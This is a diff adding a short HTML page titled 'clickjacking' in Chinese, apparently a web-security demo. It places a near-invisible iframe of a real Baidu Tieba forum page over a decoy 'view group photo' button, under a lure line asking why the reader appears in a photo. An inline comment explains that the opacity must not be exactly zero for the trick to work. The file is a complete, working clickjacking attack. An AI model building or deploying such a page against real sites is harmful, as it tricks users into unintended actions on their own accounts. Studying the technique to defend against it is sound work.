@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>点击劫持</title>
+    <style>
+        iframe{
+            width: 100%;
+            height: 500px;
+            display: block;
+            position: absolute;
+            z-index: 2;
+            opacity: 0.00;      {#注意：opacity的值不能设置为0，不然，就无法达到点击的效果#}
+        }
+
+        button{
+            position: absolute;
+            top:360px;
+            left: 740px;
+            z-index: 1;
+        }
+    </style>
+</head>
+<body>
+这个合影里面怎么有你？
+<button>查看合影</button>
+<iframe src="https://tieba.baidu.com/f?ie=utf-8&kw=%E6%A2%A6%E5%B9%BB%E9%BE%99%E6%97%8F" frameborder="0"></iframe>
+</body>
+</html>
